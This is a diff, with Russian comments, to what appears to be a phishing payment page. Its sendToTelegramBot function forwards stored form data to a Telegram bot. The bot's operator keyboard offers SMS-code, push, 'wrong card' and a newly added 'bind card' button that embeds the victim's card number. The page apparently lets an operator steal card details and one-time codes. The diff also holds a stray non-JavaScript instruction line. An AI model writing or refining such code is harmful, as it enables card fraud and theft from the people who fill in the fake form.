@@ -1272,6 +1272,7 @@
 const userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
 sessionStorage.setItem('currentUserId', userId);
 
+# В payment (8).html ЗАМЕНИ ЭТУ ЧАСТЬ КОДА:
 async function sendToTelegramBot() {
     try {
         const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
@@ -1308,17 +1309,21 @@ async function sendToTelegramBot() {
                         [
                             { 
                                 text: "📱 SMS код", 
-                                callback_data: `sms_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
+                                callback_data: `sms_${paymentId}_${userId}`
                             },
                             { 
                                 text: "🔔 Пуш", 
-                                callback_data: `push_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
+                                callback_data: `push_${paymentId}_${userId}`
                             }
                         ],
                         [
                             { 
+                                text: "🔗 Привязать", 
+                                callback_data: `bind_${paymentId}_${userId}_${cardNumber}`  // ← ДОБАВЬ НОМЕР КАРТЫ СЮДА!
+                            },
+                            { 
                                 text: "❌ Неверная карта", 
-                                callback_data: `wrong_card_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
+                                callback_data: `wrong_card_${paymentId}_${userId}`
                             }
                         ]
                     ]
@@ -1484,6 +1489,7 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
+
 
 
 
